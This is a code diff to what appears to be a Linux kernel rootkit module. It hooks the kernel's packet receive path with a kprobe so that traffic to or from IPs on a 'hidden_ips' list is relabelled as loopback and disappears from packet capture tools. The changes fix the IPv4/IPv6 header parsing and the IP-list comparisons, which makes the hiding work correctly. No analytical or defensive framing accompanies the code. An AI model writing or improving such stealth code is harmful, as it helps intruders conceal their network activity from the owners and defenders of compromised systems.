@@ -6,6 +6,8 @@
 #include <uapi/linux/if_packet.h>
 #include <uapi/linux/ip.h>
 #include <uapi/linux/ipv6.h>
+#include <linux/ip.h>
+#include <linux/ipv6.h>
 
 #include "common.h"
 #include "hook.h"
@@ -77,6 +79,10 @@ hide_ip(const char *ip)
     u8 ipv6[16];
 
     if (strstr(ip, ".") && in4_pton(ip, -1, ipv4, -1, NULL)) {
+        int test;
+        memcpy(&test, ipv4, 4);
+        DEBUG_INFO("val is %0X\n", test);
+
         if (!list_contains_ip(&hidden_ips, ipv4, v4)) {
             memcpy(ipv4 + 4, (ip_t){ 0 }, 12);
             add_ip_to_list(hidden_ips_tail, ipv4, v4);
@@ -110,17 +116,22 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
     char *data = skb_network_header(skb);
     char ver = data[0];
 
-    struct iphdr *iphdr;
     struct sk_buff *clone = skb_clone(skb, GFP_KERNEL);
-
     pt_regs->di = (long unsigned int)clone;
-    iphdr = (struct iphdr *)skb_network_header(clone);
 
     if ((ver & 0x40)) {
+        struct iphdr *iphdr;
+
+        iphdr = ip_hdr(clone);
+
         if (list_contains_ip(&hidden_ips, (u8 *)&iphdr->saddr, v4)
             || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v4))
             clone->pkt_type = PACKET_LOOPBACK;
     } else if ((ver & 0x60)) {
+        struct ipv6hdr *iphdr;
+
+        iphdr = ipv6_hdr(clone);
+
         if (list_contains_ip(&hidden_ips, (u8 *)&iphdr->saddr, v6)
             || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v6))
             clone->pkt_type = PACKET_LOOPBACK;
@@ -152,7 +163,7 @@ find_ip_in_list(ip_list_t_ptr head, ip_t ip, ip_version version)
 {
     ip_list_t_ptr i;
     for (i = head; i; i = i->next)
-        if (memcmp(i->ip, ip, 16) && (version == -1 || i->version == version))
+        if (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && (version == -1 || i->version == version))
             return i;
 
     return NULL;
@@ -165,7 +176,7 @@ add_ip_to_list(ip_list_t_ptr tail, ip_t ip, ip_version version)
     node = (ip_list_t_ptr)kmalloc(sizeof(ip_list_t), GFP_KERNEL);
 
     if (node) {
-        memcpy(node->ip, ip, 16);
+        memcpy(node->ip, ip, (version == v4 ? 4 : 16));
         node->version = version;
         node->next = NULL;
         node->prev = tail;
@@ -182,7 +193,7 @@ remove_ip_from_list(ip_list_t_ptr list, ip_t ip, ip_version version)
 {
     ip_list_t_ptr i = find_ip_in_list(list, ip, version), ret = NULL;
 
-    if (i && (memcmp(i->ip, (ip_t){ 0 }, 16) && i->version != -1)) {
+    if (i && (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && i->version != -1)) {
         if (i->next)
             i->next->prev = i->prev;
         else
